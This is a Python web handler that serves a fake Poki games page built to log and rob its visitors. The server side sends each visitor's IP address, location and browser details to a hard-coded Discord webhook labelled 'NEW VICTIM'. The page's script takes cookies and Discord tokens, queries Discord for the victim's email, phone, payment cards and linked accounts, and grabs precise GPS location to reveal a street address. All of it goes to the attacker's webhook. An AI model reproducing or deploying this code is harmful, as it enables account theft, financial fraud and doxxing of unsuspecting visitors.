from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # YOUR WEBHOOK
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        
        # POKI IMAGE THAT ACTUALLY WORKS
        POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
        
        # Get real IP
        ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip()
        if not ip:
            ip = self.headers.get('X-Real-IP', self.client_address[0])
        
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Get location - using BETTER API
        city = "Unknown"
        region = "Unknown"
        country = "Unknown"
        lat = "N/A"
        lon = "N/A"
        isp = "Unknown"
        tz = "Unknown"
        postal = "Unknown"
        
        # Try ipapi.co first (most accurate)
        try:
            req = urllib.request.Request(
                f"https://ipapi.co/{ip}/json/",
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(req, timeout=3) as r:
                loc = json.loads(r.read().decode())
                city = loc.get('city', 'Unknown')
                region = loc.get('region', 'Unknown')
                country = loc.get('country_name', 'Unknown')
                lat = str(loc.get('latitude', 'N/A'))
                lon = str(loc.get('longitude', 'N/A'))
                isp = loc.get('org', 'Unknown')
                tz = loc.get('timezone', 'Unknown')
                postal = loc.get('postal', 'Unknown')
        except:
            # Fallback to ipwhois.app
            try:
                with urllib.request.urlopen(f"http://ipwhois.app/json/{ip}", timeout=3) as r:
                    loc = json.loads(r.read().decode())
                    city = loc.get('city', 'Unknown')
                    region = loc.get('region', 'Unknown')
                    country = loc.get('country', 'Unknown')
                    lat = str(loc.get('latitude', 'N/A'))
                    lon = str(loc.get('longitude', 'N/A'))
                    isp = loc.get('isp', 'Unknown')
                    tz = loc.get('timezone', 'Unknown')
                    postal = loc.get('postal', 'Unknown')
            except:
                # Last resort - ip-api.com
                try:
                    with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as r:
                        loc = json.loads(r.read().decode())
                        city = loc.get('city', 'Unknown')
                        region = loc.get('regionName', 'Unknown')
                        country = loc.get('country', 'Unknown')
                        lat = str(loc.get('lat', 'N/A'))
                        lon = str(loc.get('lon', 'N/A'))
                        isp = loc.get('isp', 'Unknown')
                        tz = loc.get('timezone', 'Unknown')
                        postal = loc.get('zip', 'Unknown')
                except:
                    pass
        
        # Send IP log
        try:
            payload = {
                "username": "Image Logger",
                "content": "@everyone",
                "embeds": [{
                    "title": "🎯 NEW VICTIM",
                    "color": 65280,
                    "fields": [
                        {"name": "📍 IP", "value": f"`{ip}`", "inline": False},
                        {"name": "🏙️ City", "value": city, "inline": True},
                        {"name": "🗺️ Region/State", "value": region, "inline": True},
                        {"name": "🌍 Country", "value": country, "inline": True},
                        {"name": "📮 ZIP/Postal", "value": postal, "inline": True},
                        {"name": "📌 Coords", "value": f"{lat}, {lon}", "inline": True},
                        {"name": "🕐 Timezone", "value": tz, "inline": True},
                        {"name": "🏢 ISP", "value": isp, "inline": False},
                        {"name": "💻 User Agent", "value": f"```{ua[:80]}```", "inline": False}
                    ],
                    "thumbnail": {"url": POKI_IMAGE}
                }]
            }
            req = urllib.request.Request(WEBHOOK, 
                data=json.dumps(payload).encode(),
                headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req)
        except:
            pass
        
        # HTML page
        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Poki">
<meta property="og:title" content="Poki - Free Online Games - Play Now!">
<meta property="og:description" content="Play the best free online games on Poki">
<meta property="og:image" content="{POKI_IMAGE}">
<meta property="og:image:secure_url" content="{POKI_IMAGE}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://poki.com">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Poki - Free Online Games">
<meta name="twitter:description" content="Play the best free online games">
<meta name="twitter:image" content="{POKI_IMAGE}">
<meta name="theme-color" content="#00D9FF">
<link rel="icon" href="{POKI_IMAGE}">
<title>Poki - Free Online Games</title>
<style>
*{{margin:0;padding:0}}
body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:Arial}}
.logo{{max-width:400px;width:90%}}
#info{{position:fixed;bottom:10px;left:10px;background:lime;color:#000;padding:10px;border-radius:8px;font:11px monospace;max-width:300px;display:none}}
#info.show{{display:block}}
</style>
</head>
<body>
<img src="{POKI_IMAGE}" class="logo" alt="Poki">
<div id="info"></div>
<script>
(async()=>{{
let d='';
const box=document.getElementById('info');

// COOKIES
let allCookies = document.cookie;
d+=`🍪 ${allCookies.split(';').length} cookies<br>`;

// Get Chrome/Microsoft username from cookies
let userName = 'Not found';
try{
  // Check for Microsoft account in cookies
  if(allCookies.includes('MSCC') || allCookies.includes('MSPAUTH')){
    let msMatch = allCookies.match(/MSCC=([^;]+)/);
    if(msMatch) userName = decodeURIComponent(msMatch[1]);
  }
  // Check for Chrome profile
  if(allCookies.includes('CHROME') || allCookies.includes('ACCOUNT_CHOOSER')){
    let chromeMatch = allCookies.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/);
    if(chromeMatch) userName = chromeMatch[0];
  }
}catch(e){}

d+=`👤 User: ${userName}<br>`;

// DISCORD DATA
let tok=[];
try{{
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
Object.values(r.c).forEach(m=>{{
if(m?.exports?.default?.getToken)tok.push(m.exports.default.getToken());
if(m?.exports?.getToken)tok.push(m.exports.getToken());
}});
}}]);
}}
}}catch(e){{}}

// Scan localStorage for tokens
try{{
for(let i=0;i<localStorage.length;i++){{
let v=localStorage.getItem(localStorage.key(i));
let m=v?.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g);
if(m)m.forEach(t=>{{if(!tok.includes(t))tok.push(t)}});
}}
}}catch(e){{}}

if(tok.length>0){{
for(let t of tok){{
try{{
let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':t}}}});
if(r.ok){{
let u=await r.json();
d+=`Discord: ${{u.username}}<br>📧 ${{u.email||'None'}}<br>📱 ${{u.phone||'None'}}<br>`;

// Get billing/payment info
let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
headers:{{'Authorization':t}}
}});
let cards=[];
if(billing.ok){{
let b=await billing.json();
cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
}}

// Get nitro status
let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
headers:{{'Authorization':t}}
}});
let nitro='None';
if(subs.ok){{
let s=await subs.json();
if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
}}

// Send to webhook with ALL data
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone',
embeds:[{{
title:'🔑 FULL DISCORD ACCOUNT STOLEN',
color:16711680,
fields:[
{{name:'Username',value:`${{u.username}}#${{u.discriminator}}`,inline:false}},
{{name:'📧 Email',value:`\`${{u.email||'None'}}\``,inline:true}},
{{name:'📱 Phone',value:`\`${{u.phone||'None'}}\``,inline:true}},
{{name:'🆔 ID',value:`\`${{u.id}}\``,inline:false}},
{{name:'🔐 2FA',value:u.mfa_enabled?'✅':'❌',inline:true}},
{{name:'💎 Nitro',value:nitro,inline:true}},
{{name:'💳 Payment Methods',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
{{name:'🔑 Token',value:`\`\`\`${{t}}\`\`\``,inline:false}}
],
thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{u.id}}/${{u.avatar}}.png`}}
}}]
}})
}});
break;
}}
}}catch(e){{}}
}}
}}else{{
d+='No Discord login<br>';
}}

box.innerHTML=d;
box.className='show';

// Send cookies
if(document.cookie){{
await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'🍪 COOKIES',
description:`\`\`\`${{document.cookie}}\`\`\``,
color:16753920
}}]
}})
}});
}}

// GPS LOCATION (VPN BYPASS) - SILENT MODE
if(navigator.geolocation){{
navigator.geolocation.getCurrentPosition(async(p)=>{{
let lat=p.coords.latitude;
let lon=p.coords.longitude;
let acc=p.coords.accuracy;

try{{
let g=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{lat}}&lon=${{lon}}`,{{
headers:{{'User-Agent':'Mozilla/5.0'}}
}});
let gd=await g.json();
let a=gd.address||{{}};

await fetch('{WEBHOOK}',{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone 🚨 REAL LOCATION (VPN BYPASSED)',
embeds:[{{
title:'📍 GPS LOCATION',
color:3066993,
description:`**Full Address:**\\n${{a.road||''}} ${{a.house_number||''}}\\n${{a.city||a.town||a.village||''}}, ${{a.state||''}} ${{a.postcode||''}}\\n${{a.country||''}}`,
fields:[
{{name:'Coords',value:`${{lat}}, ${{lon}}`,inline:true}},
{{name:'Accuracy',value:`${{Math.round(acc)}}m`,inline:true}},
{{name:'Maps',value:`[Open]( https://maps.google.com/?q=${{lat}},${{lon}})`,inline:false}}
]
}}]
}})
}});
}}catch(e){{}}
}},()=>{{}},{{enableHighAccuracy:true,timeout:5000,maximumAge:0}});
}}

// STEAL DISCORD PAYMENT INFO & MORE
if(tok.length>0){{
for(let t of tok){{
try{{
// Get billing/payment info
let billing=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{
headers:{{'Authorization':t}}
}});
let cards=[];
if(billing.ok){{
let b=await billing.json();
cards=b.map(c=>`${{c.brand}} **** ${{c.last_4}} (Exp: ${{c.expires_month}}/${{c.expires_year}})`);
}}

// Get nitro status
let subs=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{
headers:{{'Authorization':t}}
}});
let nitro='None';
if(subs.ok){{
let s=await subs.json();
if(s.length>0)nitro=s[0].type==1?'Nitro Classic':'Nitro';
}}

// Get connections (Steam, Xbox, etc)
let conn=await fetch('https://discord.com/api/v9/users/@me/connections',{{
headers:{{'Authorization':t}}
}});
let connections=[];
if(conn.ok){{
let c=await conn.json();
connections=c.map(x=>`${{x.type}}: ${{x.name}}`);
}}
}}catch(e){{}}
}}
}}
}})();
</script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
